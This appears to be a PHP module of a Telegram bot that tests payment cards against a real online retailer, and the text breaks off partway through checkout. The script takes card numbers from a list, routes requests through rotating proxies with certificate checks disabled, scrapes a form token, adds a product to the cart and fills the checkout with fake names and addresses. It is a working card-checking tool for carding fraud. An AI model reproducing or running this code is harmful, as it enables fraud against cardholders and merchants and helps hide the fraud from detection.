<?php 

use App\Models\Bot;
use App\Gate\{CurlX, Make, Responses as Res};
use App\Faker\{Name, Address, PhoneNumber, Internet};

$curl_default = [CURLOPT_FOLLOWLOCATION => 1, CURLOPT_RETURNTRANSFER => 1, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYHOST => 0, CURLOPT_PROXY => 'socks5h://p.webshare.io:80', CURLOPT_PROXYUSERPWD => CurlX::GetRandVal(APP_PATH . '/public/files/proxy/webshare.txt')];
$ccs = $ccs[0];
$cc  = $ccs['cc'];
$cece = implode('|', $cc);
$user['ida'] = Bot::SendMsg($user['chat_id'], "<b>Gate <u>".$gate['name']."</u> <i>started</i>♻️\nCard: <code>".$cece."</code>\nTime:</b> <i>".Make::Took()."'s</i>", $user['msg_id'])['result']['message_id'];

# ~ REQ 1 ~ #
$headers1 = ['Host: www.kinnikinnick.com','Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'];
$site1 = ['url' => 'https://www.kinnikinnick.com/content.php?nid=205240','method' => 'GET', 'post' => null, 'headers' => $headers1, 'cookie' => null, 'proxy' => $proxy2];
$req1 = Make::Create(1, $site1, $gate, $user);
IsUnspam($req1, $user);

$token1 = Make::Analize($req1->body, '/html/body/div[2]/div[1]/div[3]/div/div/section[2]/div[14]/div/div/form/input[1]/@value')[0];

# ~ REQ 2 ~ #
$ch = curl_init('https://www.kinnikinnick.com/content.php?module=8&mode=7');
curl_setopt_array($ch, $curl_default);
curl_setopt_array($ch, [
    CURLOPT_HTTPHEADER => ['Host: www.kinnikinnick.com','Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8','Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3','Content-Type: application/x-www-form-urlencoded','Origin: https://www.kinnikinnick.com','DNT: 1','Connection: keep-alive','Referer: https://www.kinnikinnick.com/content.php?nid=205240','Upgrade-Insecure-Requests: 1'],
    CURLOPT_POST => 1,
    CURLOPT_POSTFIELDS => '_token='.$token1.'&add_to_cart%5B6111dc1fc92fd%5D%5Bqty%5D=1&add_to_cart%5B6111dc1fc92fd%5D%5Buid%5D=6111dc1fc92fd&add_to_cart%5B6111dc1fc92fd%5D%5Bproduct_id%5D=283&add_to_cart%5B6111dc1fc92fd%5D%5Boptions%5D%5B%5D=353%1E194&add_to_cart%5B6111dc1fc92fd%5D%5Boptions%5D%5B%5D=354%1E195&add_to_cart%5B6111dc1fc92fd%5D%5Boptions%5D%5B%5D=355%1E196&add_to_cart%5B6111dc1fc92fd%5D%5Boptions%5D%5B%5D=356%1E197&add_to_cart%5B6111dc1fc92fd%5D%5Boptions%5D%5B%5D=357%1E198&add_to_cart%5B6111dc1fc92fd%5D%5Boptions%5D%5B%5D=358%1E199&add_to_cart%5B6111dc1fc92fd%5D%5Boptions%5D%5B%5D=359%1E200&add_to_cart%5B6111dc1fc92fd%5D%5Boptions%5D%5B%5D=360%1E201&add_to_cart%5B6111dc1fc92fd%5D%5Boptions%5D%5B%5D=361%1E202&add_to_cart%5B6111dc1fc92fd%5D%5Boptions%5D%5B%5D=362%1E203&add_to_cart%5B6111dc1fc92fd%5D%5Boptions%5D%5B%5D=363%1E204&add_to_cart%5B6111dc1fc92fd%5D%5Boptions%5D%5B%5D=364%1E205&add_to_cart%5B6111dc1fc92fd%5D%5Boptions%5D%5B%5D=365%1E206&add_to_cart%5B6111dc1fc92fd%5D%5Boptions%5D%5B%5D=366%1E207&add_to_cart%5B6111dc1fc92fd%5D%5Boptions%5D%5B%5D=404%1E243&add_to_cart%5B6111dc1fc92fd%5D%5Bforce_reload%5D=0&add_to_cart%5B6111dc1fc92fd%5D%5Baction%5D=add_to_cart',
]);
$r2 = curl_exec($ch);
curl_close($ch);

Bot::EditMsgTxt($user['chat_id'], $user['ida'], Make::Wait(1, $cece, $gate['name'], $lang['wait']));

# ~ REQ 3 ~ #
$ch = curl_init('https://www.kinnikinnick.com/content.php?module=8&mode=3');
curl_setopt_array($ch, $curl_default);
curl_setopt_array($ch, [
    CURLOPT_HTTPHEADER => ['Host: www.kinnikinnick.com','Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8','Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3','Content-Type: application/x-www-form-urlencoded','Origin: https://www.kinnikinnick.com','DNT: 1','Connection: keep-alive','Referer: https://www.kinnikinnick.com/content.php?module=8&mode=3'],
    CURLOPT_POST => 1,
    CURLOPT_POSTFIELDS => '_token='.$token1.'&checkout%5Buser%5D%5Bcontact%5D%5Bshipping%5D%5Baddress_book%5D%5Bselect%5D=new&checkout%5Buser%5D%5Bcontact%5D%5Bshipping%5D%5Bcompany%5D=&checkout%5Buser%5D%5Bcontact%5D%5Bshipping%5D%5Bname%5D='.Name::firstName().'+'.Name::lastName().'&checkout%5Buser%5D%5Bcontact%5D%5Bshipping%5D%5Baddress%5D='.Address::streetAddress().'&checkout%5Buser%5D%5Bcontact%5D%5Bshipping%5D%5Baddress_extended%5D=&checkout%5Buser%5D%5Bcontact%5D%5Bshipping%5D%5Bcity%5D='.Address::city().'&checkout%5Buser%5D%5Bcontact%5D%5Bshipping%5D%5Bcountry%5D=2&checkout%5Buser%5D%5Bcont